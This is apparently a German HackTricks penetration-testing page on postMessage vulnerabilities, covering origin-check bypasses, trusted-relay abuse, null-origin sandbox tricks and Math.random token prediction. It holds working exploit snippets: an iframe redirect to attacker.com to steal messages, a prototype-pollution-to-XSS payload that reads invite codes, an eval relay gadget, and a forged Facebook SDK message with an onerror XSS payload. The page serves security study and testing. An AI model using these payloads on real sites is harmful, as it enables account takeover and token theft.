# PostMessage Schwachstellen

{{#include ../../banners/hacktricks-training.md}}

## Senden von **PostMessage**

**PostMessage** verwendet die folgende Funktion, um eine Nachricht zu senden:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Beachte, dass **targetOrigin** ein '\*' oder eine URL wie _https://company.com._ sein kann.\
Im **zweiten Szenario** kann die **Nachricht nur an diese Domain gesendet werden** (auch wenn der origin des Window-Objekts anders ist).\
Wenn das **wildcard** verwendet wird, **könnten Nachrichten an jede Domain gesendet werden**, und sie werden an den origin des Window-Objekts gesendet.

### Angriff auf iframe & wildcard in **targetOrigin**

Wie in [**diesem Bericht**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erklärt, wenn du eine Seite findest, die in ein **iframe** eingebettet werden kann (kein `X-Frame-Header`-Schutz) und die über **postMessage** eine **sensible** Nachricht unter Verwendung eines **wildcard** (\*) sendet, kannst du den **origin** des **iframe** ändern und die **sensible** Nachricht an eine von dir kontrollierte Domain **leak**.\
Beachte, dass wenn die Seite in ein **iframe** eingebettet werden kann, aber **targetOrigin** auf eine URL gesetzt ist und nicht auf ein **wildcard**, dieser **Trick nicht funktioniert**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die **`postMessages` erwartet**.\
Ein Code, der dem folgenden ähnlich ist, wird verwendet:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Beachte in diesem Fall, wie die **erste Aktion** des Codes das **Überprüfen der origin** ist. Das ist extrem **wichtig**, vor allem wenn die Seite etwas **Sensibles** mit den empfangenen Informationen machen will (z. B. ein Passwort ändern). **Wenn sie die origin nicht überprüft, können Angreifer Opfer dazu bringen, beliebige Daten an diese endpoints zu senden** und so die Passwörter der Opfer zu ändern (in diesem Beispiel).

### Aufzählung

Um **Event-Listener** auf der aktuellen Seite zu finden, kannst du:

- **Im JS-Code suchen** nach `window.addEventListener` und `$(window).on` (_JQuery version_)
- **In der Konsole der Developer Tools ausführen**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gehe zu** _Elements --> Event Listeners_ in den Developer Tools des Browsers

![](<../../images/image (396).png>)

- Nutze eine **Browser-Erweiterung** wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Diese Extensions **fangen alle Nachrichten ab** und zeigen sie dir an.

### Origin check bypasses

- Das Attribut **`event.isTrusted`** gilt als sicher, da es `True` nur für Events zurückgibt, die durch echte Benutzeraktionen erzeugt wurden. Obwohl es schwer zu umgehen ist, wenn es korrekt implementiert wird, ist seine Bedeutung für Sicherheitsprüfungen beträchtlich.
- Die Verwendung von **`indexOf()`** zur Origin-Validierung bei PostMessage-Events kann umgangen werden. Ein Beispiel, das diese Schwachstelle zeigt, ist:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`**-Methode von `String.prototype.search()` ist für reguläre Ausdrücke gedacht, nicht für Strings. Wird etwas anderes als ein RegExp übergeben, erfolgt eine implizite Konvertierung zu einem Regex, was die Methode potentiell unsicher macht. In Regex fungiert ein Punkt (.) als Wildcard, wodurch Validierungen mit speziell gestalteten Domains umgangen werden können. Zum Beispiel:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`**-Funktion arbeitet ähnlich wie `search()` mit Regex. Ist der Regex falsch aufgebaut, kann auch hier eine Umgehung möglich sein.
- Die **`escapeHtml`**-Funktion soll Eingaben durch Escaping bereinigen. Sie erzeugt jedoch kein neues escaped Objekt, sondern überschreibt die Eigenschaften des bestehenden Objekts. Dieses Verhalten lässt sich ausnutzen. Insbesondere, wenn ein Objekt so manipuliert werden kann, dass seine kontrollierte Eigenschaft `hasOwnProperty` nicht erkennt, wird `escapeHtml` nicht wie erwartet ausgeführt. Das wird in den folgenden Beispielen demonstriert:

- Erwartetes Scheitern:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Umgehung des Escapings:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Im Kontext dieser Schwachstelle ist das `File`-Objekt besonders ausnutzbar aufgrund seiner read-only `name`-Property. Diese Property wird, wenn sie in Templates verwendet wird, nicht von der `escapeHtml`-Funktion gesäubert, was zu potentiellen Sicherheitsrisiken führt.

- Die `document.domain`-Property in JavaScript kann von einem Script gesetzt werden, um die Domain zu verkürzen und so innerhalb derselben übergeordneten Domain eine entspanntere Same-Origin-Policy-Durchsetzung zu erlauben.

### Origin-only trust + trusted relays

Wenn ein Empfänger nur **`event.origin`** prüft (z. B. vertraut allen `*.trusted.com`), findet man oft eine **"relay"-Seite auf dieser Origin, die attacker-kontrollierte Parameter via `postMessage`** an ein angegebenes `targetOrigin`/`targetWindow` zurückspiegelt. Beispiele sind Marketing-/Analytics-Gadgets, die Query-Params nehmen und `{msg_type, access_token, ...}` an `opener`/`parent` weiterleiten. Du kannst:

- **Die Opferseite in einem Popup/iframe öffnen, das ein `opener` hat**, sodass dessen Handler registriert werden (viele Pixels/SDKs hängen Listener nur an, wenn `window.opener` existiert).
- **Ein anderes Angreifer-Fenster zur Relay-Endpoint auf der vertrauenswürdigen Origin navigieren**, und damit die Nachrichtenfelder füllen, die du injizieren möchtest (message type, tokens, nonces).
- Da die Nachricht jetzt **von der vertrauenswürdigen Origin kommt**, besteht die origin-only Validierung und du kannst privilegierte Aktionen (State-Änderungen, API-Calls, DOM-Schreibungen) im Listener des Opfers auslösen.

Missbrauchsmuster in der Praxis:

- Analytics-SDKs (z. B. pixel/fbevents-style) verarbeiten Nachrichten wie `FACEBOOK_IWL_BOOTSTRAP`, rufen dann **Backend-APIs unter Verwendung eines im Message gelieferten Tokens auf** und fügen **`location.href` / `document.referrer`** in den Request-Body ein. Wenn du ein eigenes Token lieferst, kannst du **diese Requests im Request-History-/Log des Tokens einsehen** und OAuth-Codes/Tokens, die in der URL/referrer der Opferseite stehen, exfiltrieren.
- Jede Relay-Seite, die beliebige Felder in `postMessage` reflektiert, erlaubt dir, **Message-Types** zu fälschen, die von privilegierten Listenern erwartet werden. In Kombination mit schwacher Input-Validierung lässt sich so Zugriff auf Graph/REST-Calls, Feature-Freischaltungen oder CSRF-ähnliche Flows erreichen.

Hunting-Tipps: enumerate `postMessage`-Listener, die nur `event.origin` prüfen, und suche dann nach **same-origin HTML/JS Endpoints, die URL-Parameter via `postMessage` weiterleiten** (Marketing-Previews, Login-Popups, OAuth-Error-Pages). Verbinde beides mit `window.open()` + `postMessage`, um Origin-Prüfungen zu umgehen.

### e.origin == window.origin bypass

Beim Einbetten einer Webseite innerhalb eines **sandboxed iframe** mit %%%%%% ist es wichtig zu verstehen, dass die Origin des iframes auf `null` gesetzt wird. Das ist insbesondere relevant bei sandbox-Attributen und deren Auswirkungen auf Sicherheit und Funktionalität.

Gibt man im sandbox-Attribut **`allow-popups`** an, erben Popups, die aus dem iframe geöffnet werden, die Sandbox-Einschränkungen des Parents. Das bedeutet, dass, sofern nicht auch das Attribut **`allow-popups-to-escape-sandbox`** gesetzt ist, die Origin des Popups ebenfalls auf `null` gesetzt wird und damit der Origin des iframes entspricht.

Folglich, wenn ein Popup unter diesen Bedingungen geöffnet wird und eine Nachricht vom iframe an das Popup via **`postMessage`** gesendet wird, haben sowohl Sender als auch Empfänger die Origin `null`. Das führt dazu, dass **`e.origin == window.origin`** zu true (`null == null`) auswertet, weil sowohl iframe als auch Popup denselben Origin-Wert `null` teilen.

Für weitere Informationen **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Es ist möglich zu prüfen, ob die Nachricht aus demselben Window stammt, in dem das Script lauscht (besonders interessant für **Content Scripts from browser extensions**, um zu prüfen, ob die Nachricht von derselben Seite gesendet wurde):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Sie können **`e.source`** einer Nachricht auf null setzen, indem Sie ein **iframe** erstellen, das die **postMessage** sendet und sofort gelöscht wird.

Für mehr Informationen **lesen:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Um diese Angriffe durchzuführen, sollten Sie idealerweise **die Opfer-Webseite** in ein `iframe` einbetten. Aber einige Header wie `X-Frame-Header` können dieses **Verhalten** **verhindern**.\
In diesen Szenarien können Sie trotzdem einen weniger unauffälligen Angriff verwenden. Sie können einen neuen Tab zur verwundbaren Webanwendung öffnen und mit ihr kommunizieren:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Nachricht stehlen, die an ein Child-iframe gesendet wird, indem die Hauptseite blockiert wird

Auf der folgenden Seite kannst du sehen, wie du eine **sensitive postmessage data** stehlen könntest, die an ein **child iframe** gesendet wird, indem du die **main** Seite vor dem Senden der Daten **blockierst** und eine **XSS im child** missbrauchst, um die **leak the data** bevor sie empfangen wird:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Nachricht stehlen durch Ändern der iframe-Location

Wenn du eine Webseite ohne X-Frame-Header iframen kannst, die ein weiteres iframe enthält, kannst du **die Location dieses child iframe ändern**, sodass — falls es eine **postmessage** empfängt, die mit einem **wildcard** gesendet wurde — ein Angreifer den **origin** dieses iframes auf eine von ihm **kontrollierte** Seite ändern und die Nachricht **stehlen** könnte:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage zu Prototype Pollution und/oder XSS

In Szenarien, in denen die über `postMessage` gesendeten Daten von JS ausgeführt werden, kannst du die **page** iframen und den **exploit** gegen die **prototype pollution/XSS** einsetzen, indem du den Exploit via `postMessage` sendest.

Ein paar **sehr gut erklärte XSS über `postMessage`** findest du unter [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Beispiel eines Exploits, um **Prototype Pollution und dann XSS** durch eine `postMessage` an ein `iframe` auszunutzen:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Für **weitere Informationen**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Trusted-origin allowlist ist keine Grenze

Eine strikte `event.origin`-Prüfung funktioniert nur, wenn die **vertrauenswürdige Origin kein attacker JS ausführen kann**. Wenn privilegierte Seiten iframes von Drittanbietern einbetten und annehmen, dass `event.origin === "https://partner.com"` sicher ist, wird jedes XSS in `partner.com` zur Brücke ins übergeordnete Fenster:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Beobachtetes Angriffsmuster in freier Wildbahn:

1. **XSS im Partner-iframe ausnutzen** und ein relay gadget platzieren, sodass jede `postMessage` zu code exec im trusted origin wird:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Von der Angreifer-Seite** sende JS an das kompromittierte iframe, das einen erlaubten Nachrichtentyp an den parent weiterleitet. Die Nachricht stammt von `partner.com`, passiert die allowlist und enthält HTML, das unsicher eingefügt wird:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Das Parent-Frame injiziert den Angreifer-HTML-Code und ermöglicht dadurch **JS-Ausführung in der Parent-Origin** (z. B. `facebook.com`), was wiederum zum Stehlen von OAuth-Codes oder zum Pivot auf vollständige Account-Takeover-Flows genutzt werden kann.

Wesentliche Erkenntnisse:

- **Partner-Origin ist keine Grenze**: Jede XSS in einem „vertrauenswürdigen“ Partner erlaubt Angreifern, erlaubte Nachrichten zu senden, die `event.origin`-Prüfungen umgehen.
- Handler, die **vom Partner kontrollierte Payloads rendern** (z. B. `innerHTML` bei bestimmten Nachrichtentypen), verwandeln eine Kompromittierung des Partners in ein same-origin DOM XSS.
- Eine breite **message surface** (viele Typen, keine Strukturvalidierung) bietet mehr Gadgets zum Pivoten, sobald ein Partner-iframe kompromittiert ist.

### Vorhersage von **`Math.random()`** Callback-Tokens in postMessage-Bridges

Wenn die Nachrichtenvalidierung ein mit `Math.random()` erzeugtes „shared secret“ verwendet (z. B. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) und derselbe Helfer auch Plugin-iframes benennt, kann man PRNG-Ausgaben rekonstruieren und vertrauenswürdige Nachrichten fälschen:

- Leak PRNG-Ausgaben über `window.name`: Das SDK vergibt automatisch Namen an Plugin-iframes mit `guid()`. Wenn du das Top-Frame kontrollierst, kannst du die Opferseite iframen, dann das Plugin-iframe zu deiner Origin navigieren (z. B. `window.frames[0].frames[0].location='https://attacker.com'`) und `window.frames[0].frames[0].name` auslesen, um eine rohe `Math.random()`-Ausgabe zu erhalten.
- Mehr Ausgaben ohne Reloads erzwingen: Einige SDKs bieten einen Reinit-Pfad; im FB SDK erzwingt das Abschicken von `init:post` mit `{xfbml:1}` `XFBML.parse()`, zerstört/erstellt das Plugin-iframe neu und erzeugt neue Namen/Callback-IDs. Wiederholte Reinit-Vorgänge liefern so viele PRNG-Ausgaben wie nötig (beachte zusätzliche interne `Math.random()`-Aufrufe für Callback-/Iframe-IDs, daher müssen Solver Zwischenwerte überspringen).
- Trusted-origin delivery via parameter pollution: Wenn ein First-Party-Plugin-Endpoint einen nicht gesäuberten Parameter in die cross-window-Payload reflektiert (z. B. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), kannst du `&type=...&iconSVG=...` injizieren und dabei die vertrauenswürdige `facebook.com`-Origin beibehalten.
- Den nächsten Callback vorhersagen: Wandle geleakte iframe-Namen zurück in Floats im Bereich `[0,1)` und füttere mehrere Werte (auch nicht aufeinanderfolgende) in einen V8-`Math.random`-Predictor (z. B. Z3-basiert). Erzeuge das nächste `guid()` lokal, um das erwartete Callback-Token zu fälschen.
- Den Sink auslösen: Stelle die postMessage-Daten so zusammen, dass die Bridge `xd.mpn.setupIconIframe` auslöst und HTML in `iconSVG` injiziert (z. B. URL-kodiertes `<img src=x onerror=...>`), womit ein DOM XSS innerhalb der Hosting-Origin erreicht wird; von dort aus können same-origin iframes (OAuth-Dialoge, arbiters, etc.) ausgelesen werden.
- Framing-Quirks helfen: Die Kette erfordert Framing. In einigen mobilen Webviews kann `X-Frame-Options` zu nicht unterstütztem `ALLOW-FROM` degradieren, wenn `frame-ancestors` vorhanden ist, und „compat“-Parameter können permissive `frame-ancestors` erzwingen, wodurch der `window.name`-Side-Channel ermöglicht wird.

#### Minimales Beispiel einer gefälschten Nachricht
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referenzen

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Zum Üben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
